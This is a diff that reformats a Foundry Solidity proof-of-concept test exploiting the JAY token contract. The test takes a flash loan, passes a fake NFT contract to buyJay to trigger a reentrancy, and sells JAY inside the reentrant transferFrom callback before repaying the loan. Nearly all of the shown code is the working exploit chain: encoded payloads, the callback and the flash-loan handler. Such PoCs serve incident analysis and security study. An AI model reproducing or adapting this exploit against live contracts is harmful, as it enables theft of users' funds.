@@ -6,7 +6,7 @@ import "contract/Arbitrage.sol";
 
 interface IPair {
     function token0() external view returns (address);
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
 }
 
 contract JAYPocTest is Test {
@@ -46,9 +46,18 @@ contract JAYPocTest is Test {
          * 1. buy: buyer get 97% jay, dev get 3% buy eth amount
          * 2. sell: buyer get 90% eth amount, dev get 3% eth amount
          */
-        payloads[1] = abi.encode(jay, first_buy_amount, abi.encodeWithSignature(
-            "buyJay(address[],uint256[],address[],uint256[],uint256[])", new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)
-        ));
+        payloads[1] = abi.encode(
+            jay,
+            first_buy_amount,
+            abi.encodeWithSignature(
+                "buyJay(address[],uint256[],address[],uint256[],uint256[])",
+                new address[](0),
+                new uint256[](0),
+                new address[](0),
+                new uint256[](0),
+                new uint256[](0)
+            )
+        );
         // buy jay second && sell jay first
         /*
          * bug 1: jay contract `buyJay` function executes any NFT transfer function, we can simulate a fake NFT contract and start up a reentry attack.
@@ -59,9 +68,18 @@ contract JAYPocTest is Test {
         erc721_address_list[0] = address(this);
         uint256[] memory erc721_id_list = new uint256[](1);
         erc721_id_list[0] = 0;
-        payloads[2] = abi.encode(jay, second_buy_amount, abi.encodeWithSignature(
-            "buyJay(address[],uint256[],address[],uint256[],uint256[])", erc721_address_list, erc721_id_list, new address[](0), new uint256[](0), new uint256[](0)
-        ));
+        payloads[2] = abi.encode(
+            jay,
+            second_buy_amount,
+            abi.encodeWithSignature(
+                "buyJay(address[],uint256[],address[],uint256[],uint256[])",
+                erc721_address_list,
+                erc721_id_list,
+                new address[](0),
+                new uint256[](0),
+                new uint256[](0)
+            )
+        );
         // sell jay second
         /* Currently `Arbitrage` does not support obtaining intermediate states as parameters.
          * So we must manually write code to simulate and calculate an approximate value.
@@ -72,7 +90,8 @@ contract JAYPocTest is Test {
         // repay loan
         uint256 repay_amount = lend_amount + lend_amount * 3 / (1000 - 3) + 1 wei;
         payloads[4] = abi.encode(weth, repay_amount, abi.encodeWithSignature("deposit()"));
-        payloads[5] = abi.encode(weth, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lender), repay_amount));
+        payloads[5] =
+            abi.encode(weth, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lender), repay_amount));
 
         // exploit
         lender.swap(lend_amount, 0, address(this), abi.encode(blockhash(block.number - 1), 0, payloads));
@@ -83,20 +102,14 @@ contract JAYPocTest is Test {
     function transferFrom(address, address, uint256) public {
         bytes[] memory payloads = new bytes[](1);
         // withdraw weth
-        payloads[0] = abi.encode(jay, 0, abi.encodeWithSignature(
-            "sell(uint256)", IERC20(jay).balanceOf(address(arbitrage))
-        ));
+        payloads[0] =
+            abi.encode(jay, 0, abi.encodeWithSignature("sell(uint256)", IERC20(jay).balanceOf(address(arbitrage))));
         arbitrage.run_no_check(abi.encode(blockhash(block.number - 1), 0, payloads));
     }
 
-    function uniswapV2Call(
-        address initiator,
-        uint256 amount0,
-        uint256 /* amount1 */,
-        bytes calldata data
-    ) external {
-        require(initiator == address(this), 'Invalid initiator');
-        require(msg.sender == address(lender), 'Invalid lender');
+    function uniswapV2Call(address initiator, uint256 amount0, uint256, /* amount1 */ bytes calldata data) external {
+        require(initiator == address(this), "Invalid initiator");
+        require(msg.sender == address(lender), "Invalid lender");
 
         IERC20(weth).transfer(address(arbitrage), amount0);
         arbitrage.run(data);
